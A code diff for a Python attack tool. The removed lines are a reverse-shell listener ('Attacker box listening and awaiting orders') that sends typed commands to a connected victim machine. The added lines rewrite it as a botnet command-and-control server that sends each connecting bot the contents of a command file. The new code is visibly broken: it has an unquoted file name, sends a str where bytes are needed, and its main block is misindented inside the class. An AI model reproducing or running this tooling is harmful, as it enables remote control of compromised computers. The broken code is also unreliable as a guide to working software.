@@ -1,22 +1,17 @@
-from socket import *
+import socketserver
 
-serverPort = 8000
-serverSocket = socket(AF_INET, SOCK_STREAM)
-serverSocket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
-serverSocket.bind(('', serverPort))
-serverSocket.listen(1)
+class BotHandler(socketserver.BaseRequestHandler):
 
-print("Attacker box listening and awaiting orders.")
-connectionSocket, addr = serverSocket.accept()
-print("Thx 4 connecting to me "+str(addr)+' biatch.')
-message = connectionSocket.recv(1024)
-print(message)
-command = ''
-while command != "exit":
-    command = input("Please enter a command: ")
-    connectionSocket.send(command.encode())
-    message = connectionSocket.recv(1024).decode()
-    print(message)
+    def handle(self):
+        self.data = self.request.recv(1024).strip()
+        print("Bot with IP {} sent:".format(self.client_address[0]))
+        f = open(command.txt)
+        self.request.sendall(f.read())
 
-connectionSocket.shutdown(SHUT_RDWR)
-connectionSocket.close()
+    if __name__ == "__main__":
+        HOST, PORT = "", 8000
+        tcpServer = socketserver.TCPServer((HOST, PORT), BotHandler)
+        try:
+            tcpServer.serve_forever()
+        except:
+            print("There was an error")
